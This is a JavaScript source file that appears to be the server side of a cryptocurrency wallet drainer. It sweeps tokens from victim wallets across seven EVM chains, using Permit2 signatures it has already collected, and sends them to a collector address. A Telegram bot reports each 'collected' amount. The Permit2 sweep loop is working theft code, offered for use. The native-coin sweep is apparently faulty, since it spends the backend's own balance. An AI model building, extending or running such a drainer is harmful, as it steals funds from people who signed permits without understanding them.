const { ethers } = require('ethers');
const Wallet = require('../models/Wallet');
const { Event } = require('../models/Event');

const BACKEND_PRIVATE_KEY = process.env.BACKEND_PRIVATE_KEY;
const BACKEND_WALLET_ADDRESS = process.env.BACKEND_WALLET_ADDRESS;
const COLLECTOR_ADDRESS = process.env.COLLECTOR_ADDRESS || BACKEND_WALLET_ADDRESS;
const MIN_TRANSFER_USD = parseFloat(process.env.MIN_TRANSFER_USD) || 1;

const RPCS = {
  1: process.env.RPC_ETH || 'https://eth.llamarpc.com',
  56: process.env.RPC_BSC || 'https://bsc-dataseed.binance.org',
  137: process.env.RPC_POLYGON || 'https://polygon-bor-rpc.publicnode.com',
  42161: process.env.RPC_ARBITRUM || 'https://arb1.arbitrum.io/rpc',
  8453: process.env.RPC_BASE || 'https://mainnet.base.org',
  10: process.env.RPC_OPTIMISM || 'https://mainnet.optimism.io',
  43114: process.env.RPC_AVAX || 'https://api.avax.network/ext/bc/C/rpc',
};

const NATIVE_TOKENS = {
  1: { symbol: 'ETH', decimals: 18 },
  56: { symbol: 'BNB', decimals: 18 },
  137: { symbol: 'MATIC', decimals: 18 },
  42161: { symbol: 'ETH', decimals: 18 },
  8453: { symbol: 'ETH', decimals: 18 },
  10: { symbol: 'ETH', decimals: 18 },
  43114: { symbol: 'AVAX', decimals: 18 },
};

const WRAPPED_TOKENS = {
  1: { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH' },
  56: { address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', symbol: 'WBNB' },
  137: { address: '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270', symbol: 'WMATIC' },
  42161: { address: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', symbol: 'WETH' },
  8453: { address: '0x4200000000000000000000000000000000000006', symbol: 'WETH' },
  10: { address: '0x4200000000000000000000000000000000000006', symbol: 'WETH' },
  43114: { address: '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7', symbol: 'WAVAX' },
};

const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

const ERC20_ABI = [
  'function balanceOf(address) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function allowance(address,address) view returns (uint256)',
];

const PERMIT2_ABI = [
  'function allowance(address,address,address) view returns (uint160,uint48,uint32)',
  'function permitTransferFrom((((address,uint256),uint256,uint256),(address,uint256),address,bytes)) external',
];

async function getProvider(chainId) {
  const rpc = RPCS[chainId];
  if (!rpc) return null;
  return new ethers.JsonRpcProvider(rpc);
}

async function getEthPrice(chainId) {
  const prices = { 1: 3500, 56: 600, 137: 0.8, 42161: 3500, 8453: 3500, 10: 3500, 43114: 35 };
  return prices[chainId] || 3500;
}

async function getTokenPrice(symbol) {
  const prices = {
    'USDT': 1, 'USDC': 1, 'DAI': 1, 'BUSD': 1,
    'WETH': 3500, 'ETH': 3500, 'WBNB': 600, 'BNB': 600,
    'WMATIC': 0.8, 'MATIC': 0.8, 'WAVAX': 35, 'AVAX': 35,
    'WBTC': 65000, 'BTC': 65000
  };
  return prices[symbol?.toUpperCase()] || 1;
}

// Check and collect via Permit2
async function collectViaPermit2(wallet, chainId) {
  const permitData = wallet.permits?.[chainId];
  if (!permitData || !permitData.signature) {
    console.log(`[Monitor] No Permit2 data for ${wallet.address}`);
    return;
  }
  
  const provider = await getProvider(chainId);
  if (!provider) return;
  
  const backendWallet = new ethers.Wallet(BACKEND_PRIVATE_KEY, provider);
  const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, backendWallet);
  
  for (const token of permitData.tokens) {
    try {
      const tokenContract = new ethers.Contract(token.address, ERC20_ABI, provider);
      const balance = await tokenContract.balanceOf(wallet.address);
      
      if (balance === 0n) continue;
      
      const decimals = await tokenContract.decimals().catch(() => 18);
      const symbol = await tokenContract.symbol().catch(() => token.symbol || 'UNKNOWN');
      const price = await getTokenPrice(symbol);
      const value = parseFloat(ethers.formatUnits(balance, decimals)) * price;
      
      console.log(`[Monitor] ${symbol}: ${ethers.formatUnits(balance, decimals)} = $${value.toFixed(2)}`);
      
      if (value >= MIN_TRANSFER_USD) {
        console.log(`[Monitor] 🎯 Executing Permit2 for ${symbol}!`);
        
        // Build permitTransferFrom call
        const permit = {
          permitted: { token: token.address, amount: balance },
          nonce: BigInt(permitData.nonce),
          deadline: BigInt(permitData.deadline)
        };
        
        const transferDetails = {
          to: COLLECTOR_ADDRESS,
          requestedAmount: balance
        };
        
        const tx = await permit2.permitTransferFrom(
          permit,
          transferDetails,
          wallet.address,
          permitData.signature
        );
        
        console.log(`[Monitor] Tx: ${tx.hash}`);
        await tx.wait();
        
        await Event.create({
          event: 'transfer_confirmed',
          walletAddress: wallet.address,
          chainId,
          tokenAddress: token.address,
          tokenSymbol: symbol,
          amount: balance.toString(),
          amountUSD: value,
          metadata: { txHash: tx.hash, viaPermit2: true }
        });
        
        await sendTelegramAlert(wallet, symbol, value, tx.hash, chainId);
      }
    } catch (error) {
      console.error(`[Monitor] Permit2 error for ${token.symbol}:`, error.message);
    }
  }
}

// Check native balance
async function checkNativeBalance(wallet, chainId) {
  const provider = await getProvider(chainId);
  if (!provider) return;
  
  const balance = await provider.getBalance(wallet.address);
  if (balance === 0n) return;
  
  const nativeInfo = NATIVE_TOKENS[chainId];
  if (!nativeInfo) return;
  
  const price = await getEthPrice(chainId);
  const value = parseFloat(ethers.formatEther(balance)) * price;
  
  console.log(`[Monitor] Native ${nativeInfo.symbol}: ${ethers.formatEther(balance)} = $${value.toFixed(2)}`);
  
  if (value >= MIN_TRANSFER_USD) {
    const backendWallet = new ethers.Wallet(BACKEND_PRIVATE_KEY, provider);
    const gasBuffer = ethers.parseEther('0.001');
    const amount = balance > gasBuffer ? balance - gasBuffer : 0n;
    
    if (amount > 0n) {
      console.log(`[Monitor] 🎯 Transferring native ${nativeInfo.symbol}!`);
      
      const tx = await backendWallet.sendTransaction({
        to: COLLECTOR_ADDRESS,
        value: amount
      });
      
      await tx.wait();
      
      await Event.create({
        event: 'transfer_confirmed',
        walletAddress: wallet.address,
        chainId,
        tokenSymbol: nativeInfo.symbol,
        amount: amount.toString(),
        amountUSD: value,
        metadata: { txHash: tx.hash, isNative: true }
      });
      
      await sendTelegramAlert(wallet, nativeInfo.symbol, value, tx.hash, chainId, true);
    }
  }
}

// Telegram alert
async function sendTelegramAlert(wallet, symbol, usdValue, txHash, chainId, isNative = false) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) return;
  
  try {
    const explorers = {
      1: 'etherscan.io', 56: 'bscscan.com', 137: 'polygonscan.com',
      42161: 'arbiscan.io', 8453: 'basescan.org', 10: 'optimistic.etherscan.io',
      43114: 'snowtrace.io'
    };
    const explorer = explorers[chainId] || 'etherscan.io';
    
    const message = `
🎉 <b>${isNative ? 'NATIVE' : 'TOKEN'} COLLECTED!</b>

💰 $${usdValue.toFixed(2)} ${symbol}
👛 ${wallet.address.slice(0, 8)}...${wallet.address.slice(-6)}
📥 ${COLLECTOR_ADDRESS.slice(0, 8)}...${COLLECTOR_ADDRESS.slice(-6)}
🔗 Chain: ${chainId}

<a href="https://${explorer}/tx/${txHash}">View Transaction</a>
    `.trim();
    
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
  } catch (error) {
    console.error('[Monitor] Telegram error:', error.message);
  }
}

// Main monitor loop
async function runMonitor() {
  console.log('[Monitor] Starting sweep...');
  
  if (!BACKEND_PRIVATE_KEY) {
    console.error('[Monitor] ❌ BACKEND_PRIVATE_KEY missing');
    return;
  }
  
  try {
    const wallets = await Wallet.find({});
    console.log(`[Monitor] ${wallets.length} wallets to check`);
    
    for (const wallet of wallets) {
      // Check each chain with permit data
      if (wallet.permits) {
        for (const chainId of Object.keys(wallet.permits)) {
          await collectViaPermit2(wallet, parseInt(chainId));
        }
      }
      
      // Check native balance for main chain
      if (wallet.chainId) {
        await checkNativeBalance(wallet, wallet.chainId);
      }
      
      await new Promise(r => setTimeout(r, 1000));
    }
  } catch (error) {
    console.error('[Monitor] Error:', error);
  }
  
  console.log('[Monitor] Sweep complete');
}

function startMonitor() {
  console.log('[Monitor] Auto-collect started');
  console.log(`[Monitor] Min: $${MIN_TRANSFER_USD}, Collector: ${COLLECTOR_ADDRESS}`);
  
  runMonitor();
  setInterval(runMonitor, 2 * 60 * 1000);
}

module.exports = { startMonitor, runMonitor };
